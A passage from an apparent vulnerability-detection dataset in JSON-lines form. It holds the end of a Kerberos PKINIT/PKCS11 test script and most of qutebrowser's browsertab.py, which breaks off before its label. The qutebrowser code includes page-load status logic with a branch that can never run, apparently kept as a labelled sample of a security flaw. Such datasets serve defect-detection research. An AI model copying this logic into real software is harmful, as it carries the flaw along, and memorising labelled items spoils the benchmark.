'%s=%s' % (p12_enc_identity, 'encrypted'),\n           realm.user_princ])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\nif not have_soft_pkcs11:\n    skip_rest('PKINIT PKCS11 tests', 'soft-pkcs11.so not found')\n\nsoftpkcs11rc = os.path.join(os.getcwd(), 'testdir', 'soft-pkcs11.rc')\nrealm.env['SOFTPKCS11RC'] = softpkcs11rc\n\n# PKINIT with PKCS11: identity, with no need for a PIN.\nconf = open(softpkcs11rc, 'w')\nconf.write(\"%s\\t%s\\t%s\\t%s\\n\" % ('user', 'user token', user_pem, privkey_pem))\nconf.close()\n# Expect to succeed without having to supply any more information.\nrealm.run(['./responder', '-x', 'pkinit=',\n           '-X', 'X509_user_identity=%s' % p11_identity, realm.user_princ])\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % p11_identity])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with PKCS11: identity, with a PIN supplied by the prompter.\nos.remove(softpkcs11rc)\nconf = open(softpkcs11rc, 'w')\nconf.write(\"%s\\t%s\\t%s\\t%s\\n\" % ('user', 'user token', user_pem,\n                                 privkey_enc_pem))\nconf.close()\n# Expect failure if the responder does nothing, and there's no prompter\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % p11_token_identity,\n           '-X', 'X509_user_identity=%s' % p11_identity, realm.user_princ],\n          expected_code=2)\nrealm.kinit(realm.user_princ,\n            flags=['-X', 'X509_user_identity=%s' % p11_identity],\n            password='encrypted')\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\n# PKINIT with PKCS11: identity, with a PIN supplied by the responder.\n# Supply the response in raw form.\nrealm.run(['./responder', '-x', 'pkinit={\"%s\": 0}' % p11_token_identity,\n           '-r', 'pkinit={\"%s\": \"encrypted\"}' % p11_token_identity,\n           '-X', 'X509_user_identity=%s' % p11_identity, realm.user_princ])\n# Supply the response through the convenience API.\nrealm.run(['./responder', '-X', 'X509_user_identity=%s' % p11_identity,\n           '-p', '%s=%s' % (p11_token_identity, 'encrypted'),\n           realm.user_princ])\nrealm.klist(realm.user_princ)\nrealm.run([kvno, realm.host_princ])\n\nsuccess('PKINIT tests')\n", "target": 0}
{"idx": 1037, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2018 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Base class for a wrapper over QWebView/QWebEngineView.\"\"\"\n\nimport enum\nimport itertools\n\nimport attr\nfrom PyQt5.QtCore import pyqtSignal, pyqtSlot, QUrl, QObject, QSizeF, Qt\nfrom PyQt5.QtGui import QIcon\nfrom PyQt5.QtWidgets import QWidget, QApplication, QDialog\nfrom PyQt5.QtPrintSupport import QPrintDialog\n\nimport pygments\nimport pygments.lexers\nimport pygments.formatters\n\nfrom qutebrowser.keyinput import modeman\nfrom qutebrowser.config import config\nfrom qutebrowser.utils import (utils, objreg, usertypes, log, qtutils,\n                               urlutils, message)\nfrom qutebrowser.misc import miscwidgets, objects\nfrom qutebrowser.browser import mouse, hints\nfrom qutebrowser.qt import sip\n\n\ntab_id_gen = itertools.count(0)\n\n\ndef create(win_id, private, parent=None):\n    \"\"\"Get a QtWebKit/QtWebEngine tab object.\n\n    Args:\n        win_id: The window ID where the tab will be shown.\n        private: Whether the tab is a private/off the record tab.\n        parent: The Qt parent to set.\n    \"\"\"\n    # Importing modules here so we don't depend on QtWebEngine without the\n    # argument and to avoid circular imports.\n    mode_manager = modeman.instance(win_id)\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        tab_class = webenginetab.WebEngineTab\n    else:\n        from qutebrowser.browser.webkit import webkittab\n        tab_class = webkittab.WebKitTab\n    return tab_class(win_id=win_id, mode_manager=mode_manager, private=private,\n                     parent=parent)\n\n\ndef init():\n    \"\"\"Initialize backend-specific modules.\"\"\"\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        webenginetab.init()\n\n\nclass WebTabError(Exception):\n\n    \"\"\"Base class for various errors.\"\"\"\n\n\nclass UnsupportedOperationError(WebTabError):\n\n    \"\"\"Raised when an operation is not supported with the given backend.\"\"\"\n\n\nTerminationStatus = enum.Enum('TerminationStatus', [\n    'normal',\n    'abnormal',  # non-zero exit status\n    'crashed',   # e.g. segfault\n    'killed',\n    'unknown',\n])\n\n\n@attr.s\nclass TabData:\n\n    \"\"\"A simple namespace with a fixed set of attributes.\n\n    Attributes:\n        keep_icon: Whether the (e.g. cloned) icon should not be cleared on page\n                   load.\n        inspector: The QWebInspector used for this webview.\n        viewing_source: Set if we're currently showing a source view.\n                        Only used when sources are shown via pygments.\n        open_target: Where to open the next link.\n                     Only used for QtWebKit.\n        override_target: Override for open_target for fake clicks (like hints).\n                         Only used for QtWebKit.\n        pinned: Flag to pin the tab.\n        fullscreen: Whether the tab has a video shown fullscreen currently.\n        netrc_used: Whether netrc authentication was performed.\n        input_mode: current input mode for the tab.\n    \"\"\"\n\n    keep_icon = attr.ib(False)\n    viewing_source = attr.ib(False)\n    inspector = attr.ib(None)\n    open_target = attr.ib(usertypes.ClickTarget.normal)\n    override_target = attr.ib(None)\n    pinned = attr.ib(False)\n    fullscreen = attr.ib(False)\n    netrc_used = attr.ib(False)\n    input_mode = attr.ib(usertypes.KeyMode.normal)\n\n    def should_show_icon(self):\n        return (config.val.tabs.favicons.show == 'always' or\n                config.val.tabs.favicons.show == 'pinned' and self.pinned)\n\n\nclass AbstractAction:\n\n    \"\"\"Attribute of AbstractTab for Qt WebActions.\n\n    Class attributes (overridden by subclasses):\n        action_class: The class actions are defined on (QWeb{Engine,}Page)\n        action_base: The type of the actions (QWeb{Engine,}Page.WebAction)\n    \"\"\"\n\n    action_class = None\n    action_base = None\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def exit_fullscreen(self):\n        \"\"\"Exit the fullscreen mode.\"\"\"\n        raise NotImplementedError\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        raise NotImplementedError\n\n    def run_string(self, name):\n        \"\"\"Run a webaction based on its name.\"\"\"\n        member = getattr(self.action_class, name, None)\n        if not isinstance(member, self.action_base):\n            raise WebTabError(\"{} is not a valid web action!\".format(name))\n        self._widget.triggerPageAction(member)\n\n    def show_source(self,\n                    pygments=False):  # pylint: disable=redefined-outer-name\n        \"\"\"Show the source of the current page in a new tab.\"\"\"\n        raise NotImplementedError\n\n    def _show_source_pygments(self):\n\n        def show_source_cb(source):\n            \"\"\"Show source as soon as it's ready.\"\"\"\n            # WORKAROUND for https://github.com/PyCQA/pylint/issues/491\n            # pylint: disable=no-member\n            lexer = pygments.lexers.HtmlLexer()\n            formatter = pygments.formatters.HtmlFormatter(\n                full=True, linenos='table')\n            # pylint: enable=no-member\n            highlighted = pygments.highlight(source, lexer, formatter)\n\n            tb = objreg.get('tabbed-browser', scope='window',\n                            window=self._tab.win_id)\n            new_tab = tb.tabopen(background=False, related=True)\n            new_tab.set_html(highlighted, self._tab.url())\n            new_tab.data.viewing_source = True\n\n        self._tab.dump_async(show_source_cb)\n\n\nclass AbstractPrinting:\n\n    \"\"\"Attribute of AbstractTab for printing the page.\"\"\"\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def check_pdf_support(self):\n        raise NotImplementedError\n\n    def check_printer_support(self):\n        raise NotImplementedError\n\n    def check_preview_support(self):\n        raise NotImplementedError\n\n    def to_pdf(self, filename):\n        raise NotImplementedError\n\n    def to_printer(self, printer, callback=None):\n        \"\"\"Print the tab.\n\n        Args:\n            printer: The QPrinter to print to.\n            callback: Called with a boolean\n                      (True if printing succeeded, False otherwise)\n        \"\"\"\n        raise NotImplementedError\n\n    def show_dialog(self):\n        \"\"\"Print with a QPrintDialog.\"\"\"\n        self.check_printer_support()\n\n        def print_callback(ok):\n            \"\"\"Called when printing finished.\"\"\"\n            if not ok:\n                message.error(\"Printing failed!\")\n            diag.deleteLater()\n\n        def do_print():\n            \"\"\"Called when the dialog was closed.\"\"\"\n            self.to_printer(diag.printer(), print_callback)\n\n        diag = QPrintDialog(self._tab)\n        if utils.is_mac:\n            # For some reason we get a segfault when using open() on macOS\n            ret = diag.exec_()\n            if ret == QDialog.Accepted:\n                do_print()\n        else:\n            diag.open(do_print)\n\n\nclass AbstractSearch(QObject):\n\n    \"\"\"Attribute of AbstractTab for doing searches.\n\n    Attributes:\n        text: The last thing this view was searched for.\n        search_displayed: Whether we're currently displaying search results in\n                          this view.\n        _flags: The flags of the last search (needs to be set by subclasses).\n        _widget: The underlying WebView widget.\n\n    Signals:\n        finished: Emitted when a search was finished.\n                  arg: True if the text was found, False otherwise.\n        cleared: Emitted when an existing search was cleared.\n    \"\"\"\n\n    finished = pyqtSignal(bool)\n    cleared = pyqtSignal()\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.text = None\n        self.search_displayed = False\n\n    def _is_case_sensitive(self, ignore_case):\n        \"\"\"Check if case-sensitivity should be used.\n\n        This assumes self.text is already set properly.\n\n        Arguments:\n            ignore_case: The ignore_case value from the config.\n        \"\"\"\n        mapping = {\n            'smart': not self.text.islower(),\n            'never': True,\n            'always': False,\n        }\n        return mapping[ignore_case]\n\n    def search(self, text, *, ignore_case='never', reverse=False,\n               result_cb=None):\n        \"\"\"Find the given text on the page.\n\n        Args:\n            text: The text to search for.\n            ignore_case: Search case-insensitively. ('always'/'never/'smart')\n            reverse: Reverse search direction.\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def clear(self):\n        \"\"\"Clear the current search.\"\"\"\n        raise NotImplementedError\n\n    def prev_result(self, *, result_cb=None):\n        \"\"\"Go to the previous result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def next_result(self, *, result_cb=None):\n        \"\"\"Go to the next result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractZoom(QObject):\n\n    \"\"\"Attribute of AbstractTab for controlling zoom.\n\n    Attributes:\n        _neighborlist: A NeighborList with the zoom levels.\n        _default_zoom_changed: Whether the zoom was changed from the default.\n    \"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self._default_zoom_changed = False\n        self._init_neighborlist()\n        config.instance.changed.connect(self._on_config_changed)\n        self._zoom_factor = float(config.val.zoom.default) / 100\n\n        # # FIXME:qtwebengine is this needed?\n        # # For some reason, this signal doesn't get disconnected automatically\n        # # when the WebView is destroyed on older PyQt versions.\n        # # See https://github.com/qutebrowser/qutebrowser/issues/390\n        # self.destroyed.connect(functools.partial(\n        #     cfg.changed.disconnect, self.init_neighborlist))\n\n    @pyqtSlot(str)\n    def _on_config_changed(self, option):\n        if option in ['zoom.levels', 'zoom.default']:\n            if not self._default_zoom_changed:\n                factor = float(config.val.zoom.default) / 100\n                self.set_factor(factor)\n            self._init_neighborlist()\n\n    def _init_neighborlist(self):\n        \"\"\"Initialize self._neighborlist.\"\"\"\n        levels = config.val.zoom.levels\n        self._neighborlist = usertypes.NeighborList(\n            levels, mode=usertypes.NeighborList.Modes.edge)\n        self._neighborlist.fuzzyval = config.val.zoom.default\n\n    def offset(self, offset):\n        \"\"\"Increase/Decrease the zoom level by the given offset.\n\n        Args:\n            offset: The offset in the zoom level list.\n\n        Return:\n            The new zoom percentage.\n        \"\"\"\n        level = self._neighborlist.getitem(offset)\n        self.set_factor(float(level) / 100, fuzzyval=False)\n        return level\n\n    def _set_factor_internal(self, factor):\n        raise NotImplementedError\n\n    def set_factor(self, factor, *, fuzzyval=True):\n        \"\"\"Zoom to a given zoom factor.\n\n        Args:\n            factor: The zoom factor as float.\n            fuzzyval: Whether to set the NeighborLists fuzzyval.\n        \"\"\"\n        if fuzzyval:\n            self._neighborlist.fuzzyval = int(factor * 100)\n        if factor < 0:\n            raise ValueError(\"Can't zoom to factor {}!\".format(factor))\n\n        default_zoom_factor = float(config.val.zoom.default) / 100\n        self._default_zoom_changed = (factor != default_zoom_factor)\n\n        self._zoom_factor = factor\n        self._set_factor_internal(factor)\n\n    def factor(self):\n        return self._zoom_factor\n\n    def set_default(self):\n        self._set_factor_internal(float(config.val.zoom.default) / 100)\n\n    def set_current(self):\n        self._set_factor_internal(self._zoom_factor)\n\n\nclass AbstractCaret(QObject):\n\n    \"\"\"Attribute of AbstractTab for caret browsing.\n\n    Signals:\n        selection_toggled: Emitted when the selection was toggled.\n                           arg: Whether the selection is now active.\n        follow_selected_done: Emitted when a follow_selection action is done.\n    \"\"\"\n\n    selection_toggled = pyqtSignal(bool)\n    follow_selected_done = pyqtSignal()\n\n    def __init__(self, tab, mode_manager, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.selection_enabled = False\n        mode_manager.entered.connect(self._on_mode_entered)\n        mode_manager.left.connect(self._on_mode_left)\n\n    def _on_mode_entered(self, mode):\n        raise NotImplementedError\n\n    def _on_mode_left(self, mode):\n        raise NotImplementedError\n\n    def move_to_next_line(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_line(self, count=1):\n        raise NotImplementedError\n\n    def move_to_next_char(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_char(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_next_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_line(self):\n        raise NotImplementedError\n\n    def move_to_end_of_line(self):\n        raise NotImplementedError\n\n    def move_to_start_of_next_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_prev_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_next_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_prev_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_document(self):\n        raise NotImplementedError\n\n    def move_to_end_of_document(self):\n        raise NotImplementedError\n\n    def toggle_selection(self):\n        raise NotImplementedError\n\n    def drop_selection(self):\n        raise NotImplementedError\n\n    def selection(self, callback):\n        raise NotImplementedError\n\n    def _follow_enter(self, tab):\n        \"\"\"Follow a link by faking an enter press.\"\"\"\n        if tab:\n            self._tab.key_press(Qt.Key_Enter, modifier=Qt.ControlModifier)\n        else:\n            self._tab.key_press(Qt.Key_Enter)\n\n    def follow_selected(self, *, tab=False):\n        raise NotImplementedError\n\n\nclass AbstractScroller(QObject):\n\n    \"\"\"Attribute of AbstractTab to manage scroll position.\"\"\"\n\n    perc_changed = pyqtSignal(int, int)\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.perc_changed.connect(self._log_scroll_pos_change)\n\n    @pyqtSlot()\n    def _log_scroll_pos_change(self):\n        log.webview.vdebug(\"Scroll position changed to {}\".format(\n            self.pos_px()))\n\n    def _init_widget(self, widget):\n        self._widget = widget\n\n    def pos_px(self):\n        raise NotImplementedError\n\n    def pos_perc(self):\n        raise NotImplementedError\n\n    def to_perc(self, x=None, y=None):\n        raise NotImplementedError\n\n    def to_point(self, point):\n        raise NotImplementedError\n\n    def to_anchor(self, name):\n        raise NotImplementedError\n\n    def delta(self, x=0, y=0):\n        raise NotImplementedError\n\n    def delta_page(self, x=0, y=0):\n        raise NotImplementedError\n\n    def up(self, count=1):\n        raise NotImplementedError\n\n    def down(self, count=1):\n        raise NotImplementedError\n\n    def left(self, count=1):\n        raise NotImplementedError\n\n    def right(self, count=1):\n        raise NotImplementedError\n\n    def top(self):\n        raise NotImplementedError\n\n    def bottom(self):\n        raise NotImplementedError\n\n    def page_up(self, count=1):\n        raise NotImplementedError\n\n    def page_down(self, count=1):\n        raise NotImplementedError\n\n    def at_top(self):\n        raise NotImplementedError\n\n    def at_bottom(self):\n        raise NotImplementedError\n\n\nclass AbstractHistory:\n\n    \"\"\"The history attribute of a AbstractTab.\"\"\"\n\n    def __init__(self, tab):\n        self._tab = tab\n        self._history = None\n\n    def __len__(self):\n        return len(self._history)\n\n    def __iter__(self):\n        return iter(self._history.items())\n\n    def current_idx(self):\n        raise NotImplementedError\n\n    def back(self, count=1):\n        \"\"\"Go back in the tab's history.\"\"\"\n        idx = self.current_idx() - count\n        if idx >= 0:\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(0))\n            raise WebTabError(\"At beginning of history.\")\n\n    def forward(self, count=1):\n        \"\"\"Go forward in the tab's history.\"\"\"\n        idx = self.current_idx() + count\n        if idx < len(self):\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(len(self) - 1))\n            raise WebTabError(\"At end of history.\")\n\n    def can_go_back(self):\n        raise NotImplementedError\n\n    def can_go_forward(self):\n        raise NotImplementedError\n\n    def _item_at(self, i):\n        raise NotImplementedError\n\n    def _go_to_item(self, item):\n        raise NotImplementedError\n\n    def serialize(self):\n        \"\"\"Serialize into an opaque format understood by self.deserialize.\"\"\"\n        raise NotImplementedError\n\n    def deserialize(self, data):\n        \"\"\"Serialize from a format produced by self.serialize.\"\"\"\n        raise NotImplementedError\n\n    def load_items(self, items):\n        \"\"\"Deserialize from a list of WebHistoryItems.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractElements:\n\n    \"\"\"Finding and handling of elements on the page.\"\"\"\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def find_css(self, selector, callback, *, only_visible=False):\n        \"\"\"Find all HTML elements matching a given selector async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n            selector: The CSS selector to search for.\n            only_visible: Only show elements which are visible on screen.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_id(self, elem_id, callback):\n        \"\"\"Find the HTML element with the given ID async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n            elem_id: The ID to search for.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_focused(self, callback):\n        \"\"\"Find the focused element on the page async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_at_pos(self, pos, callback):\n        \"\"\"Find the element at the given position async.\n\n        This is also called \"hit test\" elsewhere.\n\n        Args:\n            pos: The QPoint to get the element for.\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractAudio(QObject):\n\n    \"\"\"Handling of audio/muting for this tab.\"\"\"\n\n    muted_changed = pyqtSignal(bool)\n    recently_audible_changed = pyqtSignal(bool)\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._widget = None\n        self._tab = tab\n\n    def set_muted(self, muted: bool, override: bool = False):\n        \"\"\"Set this tab as muted or not.\n\n        Arguments:\n            override: If set to True, muting/unmuting was done manually and\n                      overrides future automatic mute/unmute changes based on\n                      the URL.\n        \"\"\"\n        raise NotImplementedError\n\n    def is_muted(self):\n        \"\"\"Whether this tab is muted.\"\"\"\n        raise NotImplementedError\n\n    def toggle_muted(self, *, override: bool = False):\n        self.set_muted(not self.is_muted(), override=override)\n\n    def is_recently_audible(self):\n        \"\"\"Whether this tab has had audio playing recently.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractTab(QWidget):\n\n    \"\"\"A wrapper over the given widget to hide its API and expose another one.\n\n    We use this to unify QWebView and QWebEngineView.\n\n    Attributes:\n        history: The AbstractHistory for the current tab.\n        registry: The ObjectRegistry associated with this tab.\n        private: Whether private browsing is turned on for this tab.\n\n        _load_status: loading status of this page\n                      Accessible via load_status() method.\n        _has_ssl_errors: Whether SSL errors happened.\n                         Needs to be set by subclasses.\n\n        for properties, see WebView/WebEngineView docs.\n\n    Signals:\n        See related Qt signals.\n\n        new_tab_requested: Emitted when a new tab should be opened with the\n                           given URL.\n        load_status_changed: The loading status changed\n        fullscreen_requested: Fullscreen display was requested by the page.\n                              arg: True if fullscreen should be turned on,\n                                   False if it should be turned off.\n        renderer_process_terminated: Emitted when the underlying renderer\n                                     process terminated.\n                                     arg 0: A TerminationStatus member.\n                                     arg 1: The exit code.\n        predicted_navigation: Emitted before we tell Qt to open a URL.\n    \"\"\"\n\n    window_close_requested = pyqtSignal()\n    link_hovered = pyqtSignal(str)\n    load_started = pyqtSignal()\n    load_progress = pyqtSignal(int)\n    load_finished = pyqtSignal(bool)\n    icon_changed = pyqtSignal(QIcon)\n    title_changed = pyqtSignal(str)\n    load_status_changed = pyqtSignal(str)\n    new_tab_requested = pyqtSignal(QUrl)\n    url_changed = pyqtSignal(QUrl)\n    shutting_down = pyqtSignal()\n    contents_size_changed = pyqtSignal(QSizeF)\n    add_history_item = pyqtSignal(QUrl, QUrl, str)  # url, requested url, title\n    fullscreen_requested = pyqtSignal(bool)\n    renderer_process_terminated = pyqtSignal(TerminationStatus, int)\n    predicted_navigation = pyqtSignal(QUrl)\n\n    # Hosts for which a certificate error happened. Shared between all tabs.\n    #\n    # Note that we remember hosts here, without scheme/port:\n    # QtWebEngine/Chromium also only remembers hostnames, and certificates are\n    # for a given hostname anyways.\n    _insecure_hosts = set()  # type: typing.Set[str]\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        self.private = private\n        self.win_id = win_id\n        self.tab_id = next(tab_id_gen)\n        super().__init__(parent)\n\n        self.registry = objreg.ObjectRegistry()\n        tab_registry = objreg.get('tab-registry', scope='window',\n                                  window=win_id)\n        tab_registry[self.tab_id] = self\n        objreg.register('tab', self, registry=self.registry)\n\n        self.data = TabData()\n        self._layout = miscwidgets.WrapperLayout(self)\n        self._widget = None\n        self._progress = 0\n        self._mode_manager = mode_manager\n        self._load_status = usertypes.LoadStatus.none\n        self._mouse_event_filter = mouse.MouseEventFilter(\n            self, parent=self)\n        self.backend = None\n\n        # FIXME:qtwebengine  Should this be public api via self.hints?\n        #                    Also, should we get it out of objreg?\n        hintmanager = hints.HintManager(win_id, self.tab_id, parent=self)\n        objreg.register('hintmanager', hintmanager, scope='tab',\n                        window=self.win_id, tab=self.tab_id)\n\n        self.predicted_navigation.connect(self._on_predicted_navigation)\n\n    def _set_widget(self, widget):\n        # pylint: disable=protected-access\n        self._widget = widget\n        self._layout.wrap(self, widget)\n        self.history._history = widget.history()\n        self.scroller._init_widget(widget)\n        self.caret._widget = widget\n        self.zoom._widget = widget\n        self.search._widget = widget\n        self.printing._widget = widget\n        self.action._widget = widget\n        self.elements._widget = widget\n        self.audio._widget = widget\n        self.settings._settings = widget.settings()\n\n        self._install_event_filter()\n        self.zoom.set_default()\n\n    def _install_event_filter(self):\n        raise NotImplementedError\n\n    def _set_load_status(self, val):\n        \"\"\"Setter for load_status.\"\"\"\n        if not isinstance(val, usertypes.LoadStatus):\n            raise TypeError(\"Type {} is no LoadStatus member!\".format(val))\n        log.webview.debug(\"load status for {}: {}\".format(repr(self), val))\n        self._load_status = val\n        self.load_status_changed.emit(val.name)\n\n    def event_target(self):\n        \"\"\"Return the widget events should be sent to.\"\"\"\n        raise NotImplementedError\n\n    def send_event(self, evt):\n        \"\"\"Send the given event to the underlying widget.\n\n        The event will be sent via QApplication.postEvent.\n        Note that a posted event may not be re-used in any way!\n        \"\"\"\n        # This only gives us some mild protection against re-using events, but\n        # it's certainly better than a segfault.\n        if getattr(evt, 'posted', False):\n            raise utils.Unreachable(\"Can't re-use an event which was already \"\n                                    \"posted!\")\n\n        recipient = self.event_target()\n        if recipient is None:\n            # https://github.com/qutebrowser/qutebrowser/issues/3888\n            log.webview.warning(\"Unable to find event target!\")\n            return\n\n        evt.posted = True\n        QApplication.postEvent(recipient, evt)\n\n    @pyqtSlot(QUrl)\n    def _on_predicted_navigation(self, url):\n        \"\"\"Adjust the title if we are going to visit an URL soon.\"\"\"\n        qtutils.ensure_valid(url)\n        url_string = url.toDisplayString()\n        log.webview.debug(\"Predicted navigation: {}\".format(url_string))\n        self.title_changed.emit(url_string)\n\n    @pyqtSlot(QUrl)\n    def _on_url_changed(self, url):\n        \"\"\"Update title when URL has changed and no title is available.\"\"\"\n        if url.isValid() and not self.title():\n            self.title_changed.emit(url.toDisplayString())\n        self.url_changed.emit(url)\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        self._progress = 0\n        self.data.viewing_source = False\n        self._set_load_status(usertypes.LoadStatus.loading)\n        self.load_started.emit()\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        \"\"\"Handle common acceptNavigationRequest code.\"\"\"\n        url = utils.elide(navigation.url.toDisplayString(), 100)\n        log.webview.debug(\"navigation request: url {}, type {}, is_main_frame \"\n                          \"{}\".format(url,\n                                      navigation.navigation_type,\n                                      navigation.is_main_frame))\n\n        if not navigation.url.isValid():\n            # Also a WORKAROUND for missing IDNA 2008 support in QUrl, see\n            # https://bugreports.qt.io/browse/QTBUG-60364\n\n            if navigation.navigation_type == navigation.Type.link_clicked:\n                msg = urlutils.get_errstring(navigation.url,\n                                             \"Invalid link clicked\")\n                message.error(msg)\n                self.data.open_target = usertypes.ClickTarget.normal\n\n            log.webview.debug(\"Ignoring invalid URL {} in \"\n                              \"acceptNavigationRequest: {}\".format(\n                                  navigation.url.toDisplayString(),\n                                  navigation.url.errorString()))\n            navigation.accepted = False\n\n    def handle_auto_insert_mode(self, ok):\n        \"\"\"Handle `input.insert_mode.auto_load` after loading finished.\"\"\"\n        if not config.val.input.insert_mode.auto_load or not ok:\n            return\n\n        cur_mode = self._mode_manager.mode\n        if cur_mode == usertypes.KeyMode.insert:\n            return\n\n        def _auto_insert_mode_cb(elem):\n            \"\"\"Called from JS after finding the focused element.\"\"\"\n            if elem is None:\n                log.webview.debug(\"No focused element!\")\n                return\n            if elem.is_editable():\n                modeman.enter(self.win_id, usertypes.KeyMode.insert,\n                              'load finished', only_if_normal=True)\n\n        self.elements.find_focused(_auto_insert_mode_cb)\n\n    @pyqtSlot(bool)\n    def _on_load_finished(self, ok):\n        if sip.isdeleted(self._widget):\n            # https://github.com/qutebrowser/qutebrowser/issues/3498\n            return\n\n        sess_manager = objreg.get('session-manager')\n        sess_manager.save_autosave()\n\n        if ok:\n            if self.url().scheme() == 'https':\n                if self.url().host() in self._insecure_hosts:\n                    self._set_load_status(usertypes.LoadStatus.warn)\n                else:\n                    self._set_load_status(usertypes.LoadStatus.success_https)\n            else:\n                self._set_load_status(usertypes.LoadStatus.success)\n        elif ok:\n            self._set_load_status(usertypes.LoadStatus.warn)\n        else:\n            self._set_load_status(usertypes.LoadStatus.error)\n\n        self.load_finished.emit(ok)\n\n        if not self.title():\n            self.title_changed.emit(self.url().toDisplayString())\n\n        self.zoom.set_current()\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        \"\"\"Emit add_history_item when triggered by backend-specific signal.\"\"\"\n        raise NotImplementedError\n\n    @pyqtSlot(int)\n    def _on_load_progress(self, perc):\n        self._progress = perc\n        self.load_progress.emit(perc)\n\n    def url(self, requested=False):\n        raise NotImplementedError\n\n    def progress(self):\n        return self._progress\n\n    def load_status(self):\n        return self._load_status\n\n    def _openurl_prepare(self, url, *, predict=True):\n        qtutils.ensure_valid(url)\n        if predict:\n            self.predicted_navigation.emit(url)\n\n    def openurl(self, url, *, predict=True):\n        raise NotImplementedError\n\n    def reload(self, *, force=False):\n        raise NotImplementedError\n\n    def stop(self):\n        raise NotImplementedError\n\n    def clear_ssl_errors(self):\n        raise NotImplementedError\n\n    def key_press(self, key, modifier=Qt.NoModifier):\n        \"\"\"Send a fake key event to this tab.\"\"\"\n        raise NotImplementedError\n\n    def dump_async(self, callback, *, plain=False):\n        \"\"\"Dump the current page's html asynchronously.\n\n        The given callback will be called with the result when dumping is\n        complete.\n        \"\"\"\n        raise NotImplementedError\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        \"\"\"Run javascript async.\n\n        The given callback will be called with the result when running JS is\n        complete.\n\n        Args:\n            code: The javascript code to run.\n            callback: The callback to call with the result, or None.\n            world: A world ID (int or usertypes.JsWorld member) to run the JS\n                   in the main world or in another isolated world.\n        \"\"\"\n        raise NotImplementedError\n\n    def shutdown(self):\n        raise NotImplementedError\n\n    def title(self):\n        raise NotImplementedError\n\n    def icon(self):\n        raise NotImplementedError\n\n    def set_html(self, html, base_url=QUrl()):\n        raise NotImplementedError\n\n    def networkaccessmanager(self):\n        \"\"\"Get the QNetworkAccessManager for this tab.\n\n        This is only implemented for QtWebKit.\n        For QtWebEngine, always returns None.\n        \"\"\"\n        raise NotImplementedError\n\n    def user_agent(self):\n        \"\"\"Get the user agent for this tab.\n\n        This is only implemented for QtWebKit.\n        For QtWebEngine, always returns None.\n        \"\"\"\n        raise NotImplementedError\n\n    def __repr__(self):\n        try:\n            url = utils.elide(self.url().toDisplayString(QUrl.EncodeUnicode),\n                              100)\n        except (AttributeError, RuntimeError) as exc:\n            url = '<{}>'.format(exc.__class__.__name__)\n        return utils.get_repr(self, tab_id=self.tab_id, url=url)\n\n    def 